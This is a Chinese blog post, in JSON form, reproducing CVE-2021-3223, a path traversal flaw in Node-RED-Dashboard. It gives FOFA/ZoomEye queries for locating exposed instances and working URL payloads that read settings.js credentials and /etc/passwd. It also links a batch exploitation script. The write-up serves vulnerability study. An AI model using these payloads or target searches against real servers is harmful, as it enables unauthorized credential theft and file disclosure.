{"title":"Node-RED任意文件读取漏洞CVE-2021-3223","uid":"0754deaddc45dd81af7f6220591fd3dc","slug":"Node-RED任意文件读取漏洞CVE-2021-3223","date":"2021-08-08T14:17:23.000Z","updated":"2021-08-08T16:20:54.868Z","comments":true,"path":"api/articles/Node-RED任意文件读取漏洞CVE-2021-3223.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210721205645.png","content":"<h1 id=\"背景知识\"><a href=\"#背景知识\" class=\"headerlink\" title=\"背景知识\"></a>背景知识</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Node-RED is a programming tool for wiring together hardware devices, APIs and online services in new and interesting ways.</p>\n<p>It provides a browser-based editor that makes it easy to wire together flows using the wide range of nodes in the palette  that can be deployed to its runtime in a single-clic.</p>\n<p>​                                                                                                                                                           -Node-RED Official Website</p></blockquote>\n<p>Node-RED是IBM开源的低代码物联网编排工具，在物联网领域有广泛应用，包括研华WISE PaaS、西门子Iot2000、美国groov EPIC/groov RIO等工业IoT硬件也都预装了Node-RED。此外，它亦常被作为低代码开发平台使用。</p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这次复现的漏洞CVE-2021-3223正是属于Node-RED-dashboard的任意文件读取漏洞，该系统是基于express.js开发，其鉴权方式是依赖配置的，默认没有任何鉴权，当开启鉴权后，会对接口进行鉴权。相关权限在settings.js文件中定义。所以将settings.js作为本次复现中要读取的重要文件之一。</p>\n<p>其中的username为用户名，password为加密后的密钥，permission为权限，关于权限的信息可以参考<a href=\"https://nodered.org/docs/user-guide/runtime/securing-Node-RED#user-permissions\">https://nodered.org/docs/user-guide/runtime/securing-Node-RED#user-permissions</a></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001739.webp\" alt=\"图片\"></p>\n<h1 id=\"漏洞影响\"><a href=\"#漏洞影响\" class=\"headerlink\" title=\"漏洞影响\"></a>漏洞影响</h1><p>Node-RED-Dashboard before 2.26.2 </p>\n<p>利用此漏洞，可以获取用户名密码和读取服务器敏感数据</p>\n<h1 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h1><p>Node-RED 在/nodes/ui_base.js中，URL与<code>/ui_base/js/*</code>匹配，然后传递给path.join，缺乏对最终路径的验证会导致路径遍历漏洞，穿越目录读取文件。</p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><h2 id=\"利用空间搜索引擎查找目标\"><a href=\"#利用空间搜索引擎查找目标\" class=\"headerlink\" title=\"利用空间搜索引擎查找目标\"></a>利用空间搜索引擎查找目标</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">fofa: title&#x3D;&quot;Node-RED&quot;\nzoomeye: title:&quot;Node-RED&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>全球分布情况：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001731.png\" alt=\"image-20210809000859182\"></p>\n<p>全球TOP10：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001729.png\" alt=\"image-20210809000946756\"></p>\n<p>我国保有量位列第4，所以影响还是很大的。设备数达到了6000以上。</p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">ip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2fsettings.js<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>尝试获取用户名和密码：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001724.png\" alt=\"image-20210809001325201\"></p>\n<p>当然也可以去尝试获取系统文件</p>\n<p>exp：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2f..%2f&#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001719.png\" alt=\"image-20210809001556660\"></p>\n<h1 id=\"批量验证脚本\"><a href=\"#批量验证脚本\" class=\"headerlink\" title=\"批量验证脚本\"></a>批量验证脚本</h1><p>另外针对此漏洞的批量化利用脚本也已经在今天写好了，后续将会同步到之前的Github仓库中，仓库地址为<a href=\"https://github.com/A1andNS/auto_vuln_test_script\">A1andNS/auto_vuln_test_script: There are some Vuln POC auto test scripts based on python3 by A1andNS (github.com)</a>，碎觉咯！</p>\n","text":"背景知识 Node-RED is a programming tool for wiring together hardware devices, APIs and online services in new and interesting ways. It provides ...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":5,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"},{"name":"任意文件","slug":"任意文件","count":1,"path":"api/tags/任意文件.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">背景知识</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D\"><span class=\"toc-text\">漏洞影响</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9F%A5%E6%89%BE%E7%9B%AE%E6%A0%87\"><span class=\"toc-text\">利用空间搜索引擎查找目标</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POC\"><span class=\"toc-text\">POC</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">批量验证脚本</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"自动化漏洞测试的小尝试","uid":"e6b5962f5d28325c61e84557aeb38a78","slug":"自动化漏洞测试的小尝试","date":"2021-07-26T06:59:03.000Z","updated":"2021-07-26T09:25:14.981Z","comments":true,"path":"api/articles/自动化漏洞测试的小尝试.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210721205645.png","text":"最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利用自动...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/tags/漏洞挖掘.json"},{"name":"自动化","slug":"自动化","count":1,"path":"api/tags/自动化.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}